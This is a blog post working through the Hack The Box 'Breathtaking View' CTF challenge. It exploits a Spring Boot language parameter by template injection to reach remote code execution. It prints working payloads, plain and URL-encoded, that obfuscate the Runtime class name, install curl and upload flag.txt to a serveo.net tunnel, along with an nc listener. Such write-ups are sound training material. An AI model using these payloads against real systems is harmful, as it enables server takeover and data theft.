---
title: 'HTB Breathtaking View Writeup (challenge)'
date: 2025-07-26
permalink: /posts/2025/07/HTB_BreathtakingView_Writeup/
tags:
  - HTB
  - writeup
  - easy
  - challenge
---

A writeup of the Hack The Box challenge "Breathtaking View" with easy difficulty

# Breathtaking View (easy)

CHALLENGE DESCRIPTION

Check out my new website showcasing a breathtaking view—let's hope no one can 'manipulate' it!

The website:

![image.png](/images/challenges/HTB_BreathtakingView/image.png)

The login is with a jsessionid.

When creating an account:

![image.png](/images/challenges/HTB_BreathtakingView/image%201.png)

And when clicking on “Change Language” it changes to French. Clicking on the button again does nothing. The URL is now `http://94.237.57.115:39244/?lang=fr`

The zip file contains a docker application. The app runs on Maven

It looks like the flag filename is randomly generated, so we can’t brute force it.

De app is a Spring Boot 2.2.0 app. The app searches a directory with a index.html in it. This is the template. This is the page that you get to see. Out flag probably is in the root dir with a random file name.

We can test which paths are accepted in the URL with `?lang=../en`  for example. This results in a 500 error. This means that traversal is possible.

Hmm interesting when creating an account with the username `../../../../flag_xxx_` and then logging in with this user and trying this URL `?lang=../../../../flag_xxx_` you get this error:

![image.png](/images/challenges/HTB_BreathtakingView/image%202.png)

So it looks like this folder is created, so path traversal is possible, but the folder has to be present. And the path components seem to be deleted so no path traversal via usernames.

Taking another approach:

 We make use of URL-encoding, this way we can install curl and run a command from the target machine:

`__*{"".getClass().forName('j'+'av'+'a.lang.Runtime').getRuntime().exec("apt update")}__::.x`

`__*{"".getClass().forName('j'+'av'+'a.lang.Runtime').getRuntime().exec("apt install -y curl")}__::.x` 

When URL-encoded it looks like this: 
`/?lang=%5f%5f%2a%7b%22%22%2e%67%65%74%43%6c%61%73%73%28%29%2e%66%6f%72%4e%61%6d%65%28%27%6a%27%2b%27%61%76%27%2b%27%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%27%29%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%61%70%74%20%69%6e%73%74%61%6c%6c%20%2d%79%20%63%75%72%6c%22%29%7d%5f%5f%3a%3a%2e%78` 

We need to expose our IP with serveo:
`ssh -R 80:localhost:1234 serveo.net` 

And we start a listener on our host machine:
`nc -nlvp 1234` 

This is the URL payload to get the flag, you need to adjust the URL to yours:
`__*{"".getClass().forName('j'+'av'+'a.lang.Runtime').getRuntime().exec("curl https://97691d4196b64b230baff59ed2f57493.serveo.net -T flag.txt")}__::.x` 

URL-encoded:

`%5f%5f%2a%7b%22%22%2e%67%65%74%43%6c%61%73%73%28%29%2e%66%6f%72%4e%61%6d%65%28%27%6a%27%2b%27%61%76%27%2b%27%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%27%29%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%75%72%6c%20%68%74%74%70%73%3a%2f%2f%39%37%36%39%31%64%34%31%39%36%62%36%34%62%32%33%30%62%61%66%66%35%39%65%64%32%66%35%37%34%39%33%2e%73%65%72%76%65%6f%2e%6e%65%74%20%2d%54%20%66%6c%61%67%2e%74%78%74%22%29%7d%5f%5f%3a%3a%2e%78`

![image.png](/images/challenges/HTB_BreathtakingView/image%203.png)